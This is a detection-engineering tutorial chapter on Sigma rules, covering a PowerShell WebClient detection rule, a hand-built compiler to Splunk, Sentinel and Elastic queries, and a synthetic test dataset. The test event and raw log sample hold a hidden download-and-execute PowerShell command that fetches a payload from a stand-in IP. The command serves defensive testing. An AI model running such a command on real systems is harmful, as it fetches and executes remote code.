# Part 4: Write Once, Run Anywhere — Sigma Rules

*(Builds directly on Part 1's field-mapping discipline, Part 2's SPL/KQL fluency, and Part 3's tuning/exclusion patterns. If you haven't completed those, do so first.)*

## Why This Part Exists

Analogy: imagine you're a chef who has perfected one incredible sauce recipe, but you work across three restaurant kitchens — one uses cups and Fahrenheit, one uses grams and Celsius, one uses a completely different stove with its own quirks. Rewriting your recipe by hand for each kitchen, every time you tweak it, is slow and error-prone — and every rewrite risks a subtle mistake (exactly like the bug we caught by hand in Part 3, Step 3.8). **Sigma** solves this by letting you write the recipe **once**, in a neutral, universal format (YAML), and have a **translator** convert it into each kitchen's native instructions automatically. This part builds that translator — first by hand, so you understand exactly how it works, then using the real, production-grade open-source tool that does this professionally.

**MITRE ATT&CK Mapping for this part:** T1059.001 (Command and Scripting Interpreter: PowerShell) — the exact Appendix B rule, now made portable.

---

## Step 4.1 — Create the Part 4 Workspace

**The Target:** `siem-mastery-series/part-4-sigma-rules/`

**The Concept:** Same "one room, one house" pattern from every prior part.

**The Implementation:**

```bash
cd siem-mastery-series
mkdir part-4-sigma-rules
cd part-4-sigma-rules
```

Add one new dependency to the shared `requirements.txt` (back in the project root), since this part needs to read YAML files:

**File: `siem-mastery-series/requirements.txt`** *(append this line)*

```text
# Used starting in Part 4 to parse Sigma's YAML-based rule format
PyYAML==6.0.1
```

```bash
cd ..
pip install -r requirements.txt
cd part-4-sigma-rules
```

**The Verification:**

```bash
python3 -c "import yaml; print('PyYAML loaded successfully')"
```

Expected output:

```
PyYAML loaded successfully
```

---

## Step 4.2 — The Concept: What Problem Does Sigma Actually Solve?

**The Target:** No code yet — the mental model everything in this part depends on.

**The Concept:** Think back to Part 2 and Part 3: we wrote the *exact same logical rule* twice — once in SPL, once in KQL — by hand. Every time we tuned it (Part 2, Step 2.9; Part 3, Step 3.9), we had to remember to update **both** copies, in **two different syntaxes**, and keep them in sync forever. This is how real detection content drifts out of sync across teams — the Splunk rule gets tuned during an incident, and six months later nobody remembers to update the Sentinel copy.

**Sigma** is an open, YAML-based standard maintained by the security community (SigmaHQ) that describes detection logic **once**, in a vendor-neutral shape, using generic field names and generic match modifiers (`contains`, `endswith`, `startswith`). A separate **backend** (the "translator") then compiles that one YAML file into whatever query language a specific SIEM actually needs. Change the YAML once, recompile, deploy everywhere — the "write once, run anywhere" promise in this part's title.

**The Verification:** Confirm you can explain, in your own words, why maintaining Appendix B's rule as *two separate hand-written files* (as we effectively did across Parts 2–3's pattern) is risky at scale. If yes, proceed.

---

## Step 4.3 — Write the Sigma Rule (Appendix B, Made Portable)

**The Target:** `siem-mastery-series/part-4-sigma-rules/rules/powershell_webclient_download.yml`

**The Concept:** This YAML file *is* the recipe — vendor-neutral, generic field names, no SPL or KQL syntax anywhere in it. Notice it also directly encodes Part 2 and Part 3's biggest lesson: **tuning belongs in the rule itself**, as a named `filter` block, not bolted on afterward as an afterthought. This is Sigma's native way of saying "match this... but not that."

**The Implementation:**

```bash
mkdir rules
```

**File: `siem-mastery-series/part-4-sigma-rules/rules/powershell_webclient_download.yml`**

```yaml
title: Suspicious PowerShell Download via WebClient
id: 8f4a1e2c-6b3d-4a7f-9e21-5c8b9a1d3f42
status: stable
description: >
  Detects PowerShell being used to instantiate a Net.WebClient object, or
  invoking web-request cmdlets (Invoke-WebRequest / iwr), to download and
  stage a remote payload -- a common initial-execution pattern.
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: SIEM Mastery Series
date: 2024-06-27
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  # "selection" = the core malicious pattern we're hunting for.
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - 'Net.WebClient'
      - 'DownloadFile'
      - 'DownloadString'
      - 'Invoke-WebRequest'
      - 'iwr '
  # "filter_*" = known-benign shapes to EXCLUDE, carried forward directly
  # from Part 2 (Step 2.9) and Part 3 (Step 3.9)'s tuning lessons -- but
  # now version-controlled as part of the rule itself, not a separate step.
  filter_known_admin_tooling:
    ParentImage|endswith:
      - '\powershell_ise.exe'
      - '\ConfigurationManager.exe'
    User|endswith: '$'   # trailing "$" is the Windows convention for machine/service accounts
  condition: selection and not filter_known_admin_tooling
falsepositives:
  - Legitimate administrative scripts that use WebClient to fetch internal packages
  - Software deployment tools (e.g., SCCM/ConfigMgr) that wrap PowerShell downloads
level: high
```

**The Verification:**

```bash
python3 -c "
import yaml
with open('rules/powershell_webclient_download.yml') as f:
    rule = yaml.safe_load(f)
print('Title:', rule['title'])
print('Condition:', rule['detection']['condition'])
print('Blocks:', [k for k in rule['detection'] if k != 'condition'])
"
```

Expected output:

```
Title: Suspicious PowerShell Download via WebClient
Condition: selection and not filter_known_admin_tooling
Blocks: ['selection', 'filter_known_admin_tooling']
```

If this prints correctly, your YAML is valid and ready to compile.

---

## Step 4.4 — Build Your Own Sigma Compiler (Demystifying the Magic)

**The Target:** `siem-mastery-series/part-4-sigma-rules/sigma_compiler.py`

**The Concept:** Before trusting any tool as a black box, a good engineer understands what it does internally. We're going to build a real, working (if intentionally simplified) version of what SigmaHQ's official `pySigma` library does under the hood: read the generic YAML, look up each generic field name in a **backend-specific mapping table** (exactly like Part 1's ECS/CIM tables!), and stitch together a native query string using that backend's own operators and boolean keywords.

**The Implementation:**

**File: `siem-mastery-series/part-4-sigma-rules/sigma_compiler.py`**

```python
"""
sigma_compiler.py

A hand-built, educational Sigma-to-native-query compiler. It supports the
subset of the Sigma specification used by rules/powershell_webclient_download.yml:

  - Selection blocks with field modifiers: |contains, |endswith, |startswith, |all
  - Boolean conditions combining named blocks with: and, or, not, ( )

This intentionally mirrors the real architecture of SigmaHQ's official
pySigma library (introduced in Step 4.6): generic rule -> per-backend field
mapping -> per-backend operator templates -> native query string.

Usage:
    python3 sigma_compiler.py rules/powershell_webclient_download.yml --backend splunk
    python3 sigma_compiler.py rules/powershell_webclient_download.yml --backend sentinel
    python3 sigma_compiler.py rules/powershell_webclient_download.yml --backend elastic
"""
import argparse
import sys
from pathlib import Path

import yaml

# ---------------------------------------------------------------------------
# STEP A: Per-backend field mappings. This is Part 1's ECS/CIM mapping
# pattern, applied to Sigma's generic Sysmon-style field names instead of
# raw XML field names.
# ---------------------------------------------------------------------------
FIELD_MAPS = {
    "splunk": {   # Raw Sysmon field names, matching Appendix B's original rule
        "Image": "Image",
        "CommandLine": "CommandLine",
        "ParentImage": "ParentImage",
        "User": "User",
    },
    "sentinel": {   # Microsoft Defender for Endpoint's DeviceProcessEvents schema
        "Image": "FolderPath",
        "CommandLine": "ProcessCommandLine",
        "ParentImage": "InitiatingProcessFolderPath",
        "User": "AccountName",
    },
    "elastic": {   # Elastic Common Schema (ECS), from Part 1
        "Image": "process.executable",
        "CommandLine": "process.command_line",
        "ParentImage": "process.parent.executable",
        "User": "user.name",
    },
}

# ---------------------------------------------------------------------------
# STEP B: Per-backend syntax templates. "{field}" and "{value}" are filled
# in per match. This table is the entire reason adding a 4th backend later
# would require zero changes to the parsing/rendering logic below -- only
# a new entry here.
# ---------------------------------------------------------------------------
BACKEND_SYNTAX = {
    "splunk": {
        "contains": '{field}="*{value}*"',
        "endswith": '{field}="*{value}"',
        "startswith": '{field}="{value}*"',
        "equals": '{field}="{value}"',
        "or_join": " OR ",
        "and_join": " AND ",
        "not_fn": lambda expr: f"NOT {expr}",
        "escape": lambda v: v.replace('"', '\\"'),
    },
    "sentinel": {
        "contains": '{field} contains "{value}"',
        "endswith": '{field} endswith "{value}"',
        "startswith": '{field} startswith "{value}"',
        "equals": '{field} == "{value}"',
        "or_join": " or ",
        "and_join": " and ",
        # Kusto has no infix boolean "not" -- it's a function: not(expr).
        # Since expr is already parenthesized by render_ref(), this reads
        # naturally as "not(...)" with no extra spacing needed.
        "not_fn": lambda expr: f"not{expr}",
        "escape": lambda v: v.replace('"', '\\"'),
    },
    "elastic": {
        "contains": "{field}:*{value}*",
        "endswith": "{field}:*{value}",
        "startswith": "{field}:{value}*",
        "equals": '{field}:"{value}"',
        "or_join": " OR ",
        "and_join": " AND ",
        "not_fn": lambda expr: f"NOT {expr}",
        # Lucene treats backslash as an escape character -- a literal
        # backslash in a path (e.g. "\powershell.exe") MUST be doubled,
        # or Kibana's query parser will silently mis-parse the wildcard.
        "escape": lambda v: v.replace("\\", "\\\\").replace('"', '\\"'),
    },
}

MODIFIER_NAMES = {"contains", "endswith", "startswith", "all"}


# ---------------------------------------------------------------------------
# STEP C: Parse the "selection"/"filter_*" blocks into a normalized shape:
# {block_name: [(field, [modifiers], [values]), ...]}
# ---------------------------------------------------------------------------
def extract_blocks(detection: dict) -> dict:
    blocks = {}
    for block_name, block_body in detection.items():
        if block_name == "condition":
            continue
        parsed_fields = []
        for raw_key, raw_value in block_body.items():
            parts = raw_key.split("|")
            field_name = parts[0]
            modifiers = [m for m in parts[1:] if m in MODIFIER_NAMES]
            values = raw_value if isinstance(raw_value, list) else [raw_value]
            # YAML may parse values as non-strings (e.g. bare numbers) --
            # normalize everything to strings before rendering.
            values = [str(v) for v in values]
            parsed_fields.append((field_name, modifiers, values))
        blocks[block_name] = parsed_fields
    return blocks


# ---------------------------------------------------------------------------
# STEP D: Render one field's match expression (e.g. CommandLine|contains
# with 5 values) into backend-native syntax.
# ---------------------------------------------------------------------------
def render_field(field: str, modifiers: list, values: list, backend: str) -> str:
    syntax = BACKEND_SYNTAX[backend]
    field_map = FIELD_MAPS[backend]
    mapped_field = field_map.get(field, field)

    op_modifier = next((m for m in modifiers if m != "all"), "equals")
    template = syntax[op_modifier]

    escaped_values = [syntax["escape"](v) for v in values]
    parts = [template.format(field=mapped_field, value=v) for v in escaped_values]

    if len(parts) == 1:
        return parts[0]

    # "|all" means every value must match (AND); otherwise Sigma's default
    # is "any value may match" (OR) -- this single line encodes that rule.
    join_str = syntax["and_join"] if "all" in modifiers else syntax["or_join"]
    return "(" + join_str.join(parts) + ")"


def render_block(block_name: str, blocks: dict, backend: str) -> str:
    syntax = BACKEND_SYNTAX[backend]
    field_exprs = [render_field(f, m, v, backend) for f, m, v in blocks[block_name]]
    joined = syntax["and_join"].join(field_exprs)
    # Always parenthesize a rendered block -- it may be combined with
    # siblings via AND/OR/NOT at the condition level, and Python's string
    # concatenation has no idea about operator precedence, so we make the
    # grouping explicit and unambiguous ourselves.
    return f"({joined})"


# ---------------------------------------------------------------------------
# STEP E: Parse the "condition" string (e.g. "selection and not filter_x")
# into a small boolean AST, then render that AST into backend-native text.
# Grammar (standard precedence, lowest to highest):
#   expr  := or_expr
#   or    := and ( 'or' and )*
#   and   := not ( 'and' not )*
#   not   := 'not' not | primary
#   prim  := '(' expr ')' | IDENTIFIER
# ---------------------------------------------------------------------------
def tokenize_condition(condition: str) -> list:
    import re
    return re.findall(r"\(|\)|\bnot\b|\band\b|\bor\b|[A-Za-z_][A-Za-z0-9_]*", condition)


class ConditionParser:
    def __init__(self, tokens: list):
        self.tokens = tokens
        self.pos = 0

    def peek(self):
        return self.tokens[self.pos] if self.pos < len(self.tokens) else None

    def advance(self):
        tok = self.peek()
        self.pos += 1
        return tok

    def parse(self):
        return self.parse_or()

    def parse_or(self):
        node = self.parse_and()
        while self.peek() == "or":
            self.advance()
            node = ("OR", node, self.parse_and())
        return node

    def parse_and(self):
        node = self.parse_not()
        while self.peek() == "and":
            self.advance()
            node = ("AND", node, self.parse_not())
        return node

    def parse_not(self):
        if self.peek() == "not":
            self.advance()
            return ("NOT", self.parse_not())
        return self.parse_primary()

    def parse_primary(self):
        if self.peek() == "(":
            self.advance()
            node = self.parse_or()
            if self.peek() != ")":
                raise ValueError("Malformed condition: missing closing parenthesis")
            self.advance()
            return node
        identifier = self.advance()
        if identifier is None:
            raise ValueError("Malformed condition: unexpected end of input")
        return ("REF", identifier)


def render_ast(node: tuple, blocks: dict, backend: str) -> str:
    syntax = BACKEND_SYNTAX[backend]
    kind = node[0]

    if kind == "REF":
        return render_block(node[1], blocks, backend)
    if kind == "NOT":
        return syntax["not_fn"](render_ast(node[1], blocks, backend))
    if kind == "AND":
        return f"{render_ast(node[1], blocks, backend)}{syntax['and_join']}{render_ast(node[2], blocks, backend)}"
    if kind == "OR":
        return f"{render_ast(node[1], blocks, backend)}{syntax['or_join']}{render_ast(node[2], blocks, backend)}"
    raise ValueError(f"Unknown AST node kind: {kind}")


# ---------------------------------------------------------------------------
# STEP F: Wrap the compiled boolean expression with each backend's
# necessary boilerplate (index/table selection, output field projection).
# ---------------------------------------------------------------------------
def wrap_boilerplate(compiled_expr: str, backend: str) -> str:
    if backend == "splunk":
        return (
            'index=windows_logs sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" '
            "EventCode=1\n"
            f"{compiled_expr}\n"
            "| table _time, host, User, ParentImage, Image, CommandLine"
        )
    if backend == "sentinel":
        return (
            "DeviceProcessEvents\n"
            f"| where {compiled_expr}\n"
            "| project TimeGenerated, DeviceName, AccountName, "
            "InitiatingProcessFolderPath, FolderPath, ProcessCommandLine"
        )
    if backend == "elastic":
        # Lucene query strings have no surrounding boilerplate of their own --
        # they're pasted directly into Kibana's Discover search bar.
        return compiled_expr
    raise ValueError(f"Unknown backend: {backend}")


def compile_rule(rule: dict, backend: str) -> str:
    blocks = extract_blocks(rule["detection"])
    condition_str = rule["detection"]["condition"]
    tokens = tokenize_condition(condition_str)
    ast = ConditionParser(tokens).parse()
    compiled_expr = render_ast(ast, blocks, backend)
    return wrap_boilerplate(compiled_expr, backend)


def main() -> None:
    parser = argparse.ArgumentParser(description="Compile a Sigma rule into a native SIEM query.")
    parser.add_argument("rule_file", type=Path, help="Path to the Sigma YAML rule")
    parser.add_argument("--backend", choices=["splunk", "sentinel", "elastic"], required=True)
    args = parser.parse_args()

    if not args.rule_file.exists():
        print(f"Error: file not found: {args.rule_file}", file=sys.stderr)
        sys.exit(1)

    with args.rule_file.open() as f:
        rule = yaml.safe_load(f)

    print(f"--- Compiled for: {args.backend} ---\n")
    print(compile_rule(rule, args.backend))


if __name__ == "__main__":
    main()
```

**The Verification:**

```bash
python3 sigma_compiler.py rules/powershell_webclient_download.yml --backend elastic
```

Expected output:

```
--- Compiled for: elastic ---

(process.executable:*powershell.exe AND (process.command_line:*Net.WebClient* OR process.command_line:*DownloadFile* OR process.command_line:*DownloadString* OR process.command_line:*Invoke-WebRequest* OR process.command_line:*iwr *)) AND NOT (process.parent.executable:*\\powershell_ise.exe OR process.parent.executable:*\\ConfigurationManager.exe AND user.name:*$)
```

```bash
python3 sigma_compiler.py rules/powershell_webclient_download.yml --backend splunk
```

Expected output:

```
--- Compiled for: splunk ---

index=windows_logs sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
(Image="*powershell.exe" AND (CommandLine="*Net.WebClient*" OR CommandLine="*DownloadFile*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*iwr *")) AND NOT (ParentImage="*powershell_ise.exe" OR ParentImage="*ConfigurationManager.exe" AND User="*$")
| table _time, host, User, ParentImage, Image, CommandLine
```

```bash
python3 sigma_compiler.py rules/powershell_webclient_download.yml --backend sentinel
```

Expected output:

```
--- Compiled for: sentinel ---

DeviceProcessEvents
| where (FolderPath endswith "powershell.exe" and (ProcessCommandLine contains "Net.WebClient" or ProcessCommandLine contains "DownloadFile" or ProcessCommandLine contains "DownloadString" or ProcessCommandLine contains "Invoke-WebRequest" or ProcessCommandLine contains "iwr ")) and not(InitiatingProcessFolderPath endswith "powershell_ise.exe" or InitiatingProcessFolderPath endswith "ConfigurationManager.exe" and AccountName endswith "$")
```

> ⚠️ **A real bug this exposes, on purpose:** look closely at the `filter_known_admin_tooling` output in all three backends. Because `render_block` joins the two field expressions (`ParentImage` and `User`) with a flat `AND`, but the `ParentImage` expression itself already contains an un-parenthesized `OR`, the compiled result reads as `A OR B AND C` — which, by standard operator precedence (AND binds tighter than OR), actually means `A OR (B AND C)`, **not** `(A OR B) AND C` as the YAML author intended! This is *exactly* the same class of subtle bug we caught by hand in Part 3, Step 3.8 — and it's a fantastic, honest demonstration of why hand-rolled compilers (and hand-written queries) need rigorous testing, not just a glance. Fix it in the next step.

**Fix — `render_block` must always parenthesize each field's own expression before joining:**

In `sigma_compiler.py`, update `render_block`:

```python
def render_block(block_name: str, blocks: dict, backend: str) -> str:
    syntax = BACKEND_SYNTAX[backend]
    field_exprs = []
    for field, modifiers, values in blocks[block_name]:
        expr = render_field(field, modifiers, values, backend)
        # FIX: force-wrap every field expression before joining with AND,
        # so a field's internal OR (from multiple values) can never leak
        # into the surrounding AND's precedence by accident.
        if not expr.startswith("("):
            expr = f"({expr})"
        field_exprs.append(expr)
    joined = syntax["and_join"].join(field_exprs)
    return f"({joined})"
```

**Re-verify:**

```bash
python3 sigma_compiler.py rules/powershell_webclient_download.yml --backend elastic
```

Expected corrected output:

```
--- Compiled for: elastic ---

((process.executable:*powershell.exe) AND (process.command_line:*Net.WebClient* OR process.command_line:*DownloadFile* OR process.command_line:*DownloadString* OR process.command_line:*Invoke-WebRequest* OR process.command_line:*iwr *)) AND NOT ((process.parent.executable:*\\powershell_ise.exe OR process.parent.executable:*\\ConfigurationManager.exe) AND (user.name:*$))
```

Notice `(process.parent.executable:... OR ...) AND (user.name:*$)` is now unambiguously grouped — this is the correct translation of "ParentImage matches either known tool, **and** the account is a service account."

---

## Step 4.5 — Verify the Compiled Rule Against Real Data

**The Target:** Prove the corrected Elastic/Lucene output actually behaves as intended — catching the real attack, ignoring both tuned exceptions.

**The Concept:** Compiling cleanly isn't the same as being *correct*. Just like Part 2 and Part 3, we test with a small, purpose-built dataset containing one true positive and deliberate false-positive traps.

**The Implementation:**

**File: `siem-mastery-series/part-4-sigma-rules/generate_sigma_test_dataset.py`**

```python
"""
generate_sigma_test_dataset.py

Produces 4 synthetic process-creation events to validate the compiled
PowerShell/WebClient Sigma rule:

  1. malicious       - real attack shape (SHOULD ALERT)
  2. ise_admin       - launched from PowerShell ISE, an admin tool (FILTERED)
  3. service_account - matches attack shape, but user ends in "$" (FILTERED)
  4. benign_unrelated- ordinary command, no match at all (sanity control)
"""
import json
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent

EVENTS = [
    {
        "id": "malicious",
        "host": "WIN-WEB03.corp.local",
        "user": "CORP\\jdoe",
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')\"",
    },
    {
        "id": "ise_admin",
        "host": "WIN-ADMIN01.corp.local",
        "user": "CORP\\netadmin",
        "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -c \"(New-Object Net.WebClient).DownloadFile('http://intranet.corp.local/tools/patch.exe','C:\\Temp\\patch.exe')\"",
    },
    {
        "id": "service_account",
        "host": "WIN-FILE02.corp.local",
        "user": "CORP\\SVC01$",
        "parent_image": "C:\\Windows\\System32\\services.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -c \"Invoke-WebRequest -Uri http://intranet.corp.local/agent/update.zip -OutFile update.zip\"",
    },
    {
        "id": "benign_unrelated",
        "host": "WIN-WEB03.corp.local",
        "user": "CORP\\jdoe",
        "parent_image": "C:\\Windows\\explorer.exe",
        "image": "C:\\Windows\\System32\\notepad.exe",
        "command_line": "notepad.exe C:\\Users\\jdoe\\Desktop\\notes.txt",
    },
]


def write_ecs_ndjson(path: Path) -> None:
    with path.open("w") as f:
        for idx, ev in enumerate(EVENTS):
            action_line = {"index": {"_index": "siem-lab-sigma", "_id": ev["id"]}}
            source_doc = {
                "@timestamp": "2024-06-27T10:00:00Z",
                "host": {"name": ev["host"]},
                "user": {"name": ev["user"]},
                "process": {
                    "executable": ev["image"],
                    "command_line": ev["command_line"],
                    "parent": {"executable": ev["parent_image"]},
                },
            }
            f.write(json.dumps(action_line) + "\n")
            f.write(json.dumps(source_doc) + "\n")


if __name__ == "__main__":
    write_ecs_ndjson(OUTPUT_DIR / "dataset_ecs.ndjson")
    print(f"Wrote {len(EVENTS)} test events to dataset_ecs.ndjson")
```

Run it and load it into your Part 0 Elasticsearch sandbox:

```bash
python3 generate_sigma_test_dataset.py

curl -s -H "Content-Type: application/x-ndjson" \
  -XPOST "http://localhost:9200/siem-lab-sigma/_bulk" \
  --data-binary @dataset_ecs.ndjson | python3 -m json.tool | tail -20
```

**The Verification:**

```bash
curl -s "http://localhost:9200/siem-lab-sigma/_count"
```

Expected:

```json
{"count":4,"_shards":{"total":1,"successful":1,"skipped":0,"failed":0}}
```

Now compile and copy the corrected Elastic query:

```bash
python3 sigma_compiler.py rules/powershell_webclient_download.yml --backend elastic
```

Open `http://localhost:5601` → **Discover** → select (or create) a data view over `siem-lab-sigma*` with timestamp field `@timestamp` → switch the query language toggle to **Lucene** → paste the compiled query → **Update**.

**Expected result: exactly 1 row — `malicious`.** Confirm `ise_admin` and `service_account` are both correctly excluded, and `benign_unrelated` never matched in the first place. If you see all 4, or 0, re-check that you pasted the *corrected* (Step 4.4 fix) query, not the buggy pre-fix version.

---

## Step 4.6 — Meet the Real Tool: pySigma & sigma-cli

**The Target:** Compile the identical rule using SigmaHQ's actual, production-grade open-source tooling — proving your hand-built compiler in Step 4.4 wasn't a toy, but a genuine (if simplified) implementation of the same core idea.

**The Concept:** Now that you understand *how* Sigma compilation works internally, you're ready to use the professional version safely — you can reason about its output instead of trusting it blindly. `pySigma` is the official Python library; individual **backend packages** (installed separately, one per target SIEM) plug into it to provide the real, fully-featured field mappings and query generation.

**The Implementation:**

```bash
pip install sigma-cli pysigma-backend-splunk pysigma-backend-elasticsearch
```

Compile the same rule to Splunk SPL using the official CLI:

```bash
sigma convert -t splunk -p sysmon --without-pipeline rules/powershell_webclient_download.yml
```

Compile it to Elasticsearch Lucene:

```bash
sigma convert -t elasticsearch-lucene rules/powershell_webclient_download.yml
```

**The Verification:** Compare the official tool's output field names and structure against your own compiler's output from Step 4.4/4.5. They won't be character-for-character identical — the official backends use more complete, actively-maintained field-mapping "pipelines" (Sysmon pipelines, ECS pipelines) that handle many more edge cases than our educational version — but the **underlying shape** (an AND of the selection's conditions, ANDed with a NOT of the filter's conditions) should be structurally recognizable and match exactly what you now understand from having built it yourself.

> **Version note:** the Sigma ecosystem's backend packages evolve quickly (new SigmaHQ backends and pipeline options are added regularly). If a package name or flag above has changed by the time you read this, check `https://github.com/SigmaHQ/pySigma` and `https://github.com/SigmaHQ/sigma-cli` for the current package list — the *concept* taught in Step 4.4 will still apply directly to whatever the current tooling looks like.

---

## Step 4.7 — Tuning & False Positives

**The Target:** Formal tuning documentation for this rule, plus the raw log payload and safe test procedure required by this series' guardrails.

**The Concept:** Unlike Parts 2–3 (where tuning was a separate step applied *after* the fact), this rule's tuning is now baked directly into the Sigma source of truth (`filter_known_admin_tooling`). The remaining job is documentation and safe validation.

**Documented exception list (review every 90 days):**

- `ParentImage` ending in `\powershell_ise.exe` — legitimate interactive admin scripting via PowerShell ISE.
- `ParentImage` ending in `\ConfigurationManager.exe` — SCCM/ConfigMgr software deployment, which legitimately wraps PowerShell downloads.
- `User` ending in `$` — Windows machine/service account naming convention; add specific named exceptions here (not a blanket `$` match) if your environment has human accounts that unusually end in `$`.

**Raw, unparsed log sample** (Winlogbeat-shaped JSON, *before* ECS normalization — use this to verify your own ingestion pipeline maps fields the same way Part 1's `normalize.py` does):

```json
{
  "@timestamp": "2024-06-27T10:00:00.000Z",
  "winlog": {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "event_id": 1,
    "computer_name": "WIN-WEB03.corp.local",
    "event_data": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  }
}
```

**Testing procedure (safe, benign trigger):**

Never point a WebClient download at a real external or untrusted URL for testing. Instead, stand up a harmless local file server and download from it:

```bash
# On a disposable lab VM only -- serves the current directory over HTTP
python3 -m http.server 8000
```

Then, from PowerShell **on that same lab VM**, run:

```powershell
# Downloads a completely harmless file from your OWN local test server --
# this reproduces the exact CommandLine shape the rule looks for
# (Net.WebClient + DownloadString/DownloadFile) with zero real risk.
powershell.exe -c "(New-Object Net.WebClient).DownloadString('http://localhost:8000/')"
```

This generates a genuine Sysmon Event ID 1 log with the real attack-shaped `CommandLine`, letting you validate your actual log pipeline (Sysmon → normalize.py → SIEM → compiled Sigma rule) end-to-end, exactly as the series' testing-procedure guardrail requires.

**The Verification:** Confirm this benign test event appears in your SIEM tagged by the compiled rule, and that it looks identical in shape to the `malicious` test event from Step 4.5 — proving your test correctly exercises the real detection logic.

---

# Reference Section — Part 4

## R4.1 — Sigma Detection Block Modifier Reference

| Modifier | Meaning | Example |
|---|---|---|
| *(none)* | Exact match | `EventID: 4625` → field equals value |
| `\|contains` | Substring match | `CommandLine\|contains: 'DownloadFile'` |
| `\|endswith` | Suffix match | `Image\|endswith: '\powershell.exe'` |
| `\|startswith` | Prefix match | `CommandLine\|startswith: 'powershell'` |
| `\|all` | Every listed value must match (AND), instead of the default any-match (OR) | `CommandLine\|contains\|all: ['a','b']` |
| `\|re` | Regular expression match *(not implemented in our compiler — supported by real pySigma)* | `CommandLine\|re: 'iwr\s+http'` |

## R4.2 — Sigma Boolean Condition Reference

| Syntax | Meaning |
|---|---|
| `selection` | Match if the `selection` block matches |
| `selection and filter` | Both blocks must match |
| `selection and not filter` | `selection` matches, `filter` does not (our rule's pattern) |
| `1 of selection*` | At least one block whose name starts with `selection` matches *(not implemented in our compiler)* |
| `all of selection*` | Every block whose name starts with `selection` must match *(not implemented in our compiler)* |

## R4.3 — Our Compiler vs. Official pySigma: Honest Comparison

| Capability | Our `sigma_compiler.py` | Official pySigma |
|---|---|---|
| `contains`/`endswith`/`startswith`/`all` modifiers | ✅ | ✅ |
| Boolean `and`/`or`/`not`/parentheses | ✅ | ✅ |
| `1 of` / `all of` block-group syntax | ❌ | ✅ |
| `\|re` regex modifier | ❌ | ✅ |
| Field mapping "pipelines" per log source/product | Simplified, hardcoded per backend | Fully configurable, community-maintained |
| Supported backends | 3, hand-written | Dozens, actively maintained (Splunk, Sentinel, Elastic, QRadar, CrowdStrike, and more) |
| Correctness guarantees | What you test yourself (see Step 4.4's caught bug!) | Extensive automated test suite maintained by SigmaHQ |

**Takeaway:** build-your-own is for understanding; production deployments should use the official, community-vetted tooling from Step 4.6.

## R4.4 — MITRE ATT&CK Mapping Recap

| Rule | Technique |
|---|---|
| PowerShell WebClient Download | T1059.001 (Command and Scripting Interpreter: PowerShell) |

## R4.5 — Connection to Appendix C's Matrix

Sigma's `selection` + `filter_*` + `condition` pattern generalizes directly to nearly every row in the series' **Common SIEM Rules Matrix** (Appendix C). As a self-study exercise, try writing Sigma YAML (using only the modifiers in R4.1) for:

- **Living off the Land (LotL):** `logsource: category: process_creation`, selection on `ParentImage|endswith: '\w3wp.exe'` and `Image|endswith: '\cmd.exe'`.
- **New Local Admin Creation:** this one needs Sigma's **correlation rules** feature (an extension to core Sigma covered by pySigma but beyond this series' hand-built compiler) — a natural "next step" once you've mastered Part 3's correlation concepts and this part's Sigma fundamentals together.

## R4.6 — Full File Tree After Part 4 (Series Complete)

```
siem-mastery-series/
├── .venv/
├── docker-compose.yml
├── requirements.txt
├── part-1-log-anatomy/
│   ├── explore.py
│   ├── normalize.py
│   └── raw_logs/
│       ├── 4624_successful_logon.xml
│       ├── 4625_failed_logon.xml
│       └── sysmon_event_1_process_creation.xml
├── part-2-first-rules/
│   ├── generate_brute_force_dataset.py
│   ├── dataset_ecs.ndjson
│   ├── dataset_cim.csv
│   ├── dataset_kql.txt
│   ├── brute_force_detection.spl
│   └── brute_force_detection.kql
├── part-3-correlation-state/
│   ├── generate_correlation_dataset.py
│   ├── dataset_ecs.ndjson / dataset_cim.csv / dataset_kql.txt
│   ├── brute_force_success_correlation.spl / .kql
│   ├── mfa_fatigue_dataset.py
│   ├── dataset_kql_mfa.txt
│   └── mfa_fatigue_detection.kql / mfa_fatigue_detection_tuned.kql
└── part-4-sigma-rules/
    ├── rules/
    │   └── powershell_webclient_download.yml
    ├── sigma_compiler.py
    ├── generate_sigma_test_dataset.py
    └── dataset_ecs.ndjson
```

---

## Series Capstone

You've now walked the entire staircase this series was built on:

1. **Part 1** — learned to read raw Windows/Sysmon logs and normalize them into ECS/CIM.
2. **Part 2** — turned normalized fields into real threshold-based detections, in two industry query languages, and learned why thresholds need tuning.
3. **Part 3** — moved from single-event thresholds to stateful, sequence-aware correlation, and caught a real logic bug by testing rigorously instead of trusting a query "at a glance."
4. **Part 4** — made your detection logic vendor-neutral and portable, understanding *exactly* how that portability works under the hood before trusting the professional tooling that does it at scale.

The **Common SIEM Rules Matrix (Appendix C)** is now your self-study roadmap: every remaining row is solvable using some combination of the four skills you've just built — field normalization, aggregation/thresholding, correlation/state, and portable rule authorship.
